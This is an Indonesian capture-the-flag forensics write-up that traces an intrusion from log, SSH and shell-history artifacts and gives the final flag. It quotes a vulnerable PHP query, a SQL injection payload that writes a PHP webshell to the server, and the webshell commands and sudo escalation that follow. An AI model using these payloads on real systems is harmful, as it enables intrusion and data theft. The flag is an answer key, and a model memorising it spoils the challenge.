# Writeup Challenge Demo

Challenge ini memberikan snapshot dua host:

- `service/` mewakili web server
- `DB/` mewakili database server

Target analisisnya adalah menjawab empat hal:

1. Vulnerability apa yang dipakai untuk initial access
2. File apa yang di-upload
3. Attacker kemudian beroperasi sebagai user apa
4. File apa yang dicopy

## 1. Recon awal

Pertama saya enumerasi isi artefak dan menemukan file penting berikut:

- `service/var/log/apache2/access.log`
- `service/var/log/apache2/error.log`
- `service/var/www/html/index.php`
- `service/var/www/html/config.php`
- `service/home/www-data/.bash_history`
- `service/home/www-data/.ssh_key_key`
- `DB/var/log/auth.log`
- `DB/home/dbadmin/.bash_history`
- `DB/home/dbadmin/.ssh_authorized_keys`

Ini langsung menunjukkan bahwa challenge ini bisa diselesaikan murni dari korelasi source code, web log, SSH artifact, dan shell history.

## 2. Menentukan initial access

File `service/var/www/html/index.php` berisi query SQL yang memakai parameter `id` tanpa sanitasi:

```php
$id = $_GET['id'];
$sql = "SELECT title, content FROM articles WHERE id = $id";
```

Itu adalah SQL Injection yang jelas.

Log akses Apache memberi bukti eksploitasi yang sangat eksplisit:

```text
192.168.1.100 - - [26/Mar/2026:10:16:05 +0300] "GET /index.php?id=1%20UNION%20SELECT%201,%27%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E%27%20INTO%20OUTFILE%20%27/var/www/html/uploads/shell.php%27 HTTP/1.1" 200 12 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
```

Dari request ini terlihat attacker memakai:

- `UNION SELECT`
- `INTO OUTFILE`
- payload PHP

Artinya initial access diperoleh melalui **SQL Injection** pada `index.php`.

## 3. Menentukan file yang di-upload

Request tadi juga sekaligus menunjukkan file yang ditulis ke server:

- `/var/www/html/uploads/shell.php`

Nama filenya adalah `shell.php`.

Log berikut mengonfirmasi file itu langsung dipanggil sebagai webshell:

```text
192.168.1.100 - - [26/Mar/2026:10:16:15 +0300] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 30
192.168.1.100 - - [26/Mar/2026:10:16:20 +0300] "GET /uploads/shell.php?cmd=ls%20-la%20/home/www-data HTTP/1.1" 200 200
192.168.1.100 - - [26/Mar/2026:10:16:25 +0300] "GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php HTTP/1.1" 200 500
```

Jadi file yang di-upload adalah **`shell.php`**.

## 4. Pivot dari web server ke DB server

Attacker lalu membaca `config.php` lewat webshell. Di file itu ada kredensial sensitif:

- `SSH_HOST = 192.168.1.50`
- `SSH_USER = dbadmin`
- `SSH_KEY = /home/www-data/.ssh_key_key`

Di host web server memang ada private key:

- `service/home/www-data/.ssh_key_key`

Di host DB ada authorized key milik `dbadmin`:

- `DB/home/dbadmin/.ssh_authorized_keys`

Keduanya cocok. Fingerprint private key dan public key sama.

Lalu `DB/var/log/auth.log` memberi bukti login SSH:

```text
Mar 26 10:16:30 victim-db sshd[5680]: Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6cLRP4m5w60fHK1BGmWooBTXIWz+vtVHmuH/luoVQ
Mar 26 10:16:31 victim-db sshd[5681]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)
Mar 26 10:16:35 victim-db sudo: dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/bin/bash
```

Jadi attacker kemudian beroperasi sebagai **`dbadmin`** pada DB server, lalu memakai `sudo` untuk naik ke root.

## 5. Menentukan file yang dicopy

File `DB/home/dbadmin/.bash_history` adalah bukti paling langsung:

```text
cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data
ls -la /tmp/
cat /tmp/.backup_data
rm /tmp/.backup_data
```

File yang dicopy adalah:

- **`confidential_data.sql`**

Nama path sumber lengkapnya:

- `/var/lib/mysql/confidential_data.sql`

## 6. Kesimpulan

Empat komponen flag adalah:

- Vulnerability: `SQLi`
- Uploaded file: `shell.php`
- User yang kemudian dipakai: `dbadmin`
- File yang dicopy: `confidential_data.sql`

Sehingga flag finalnya adalah:

```text
KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}
```
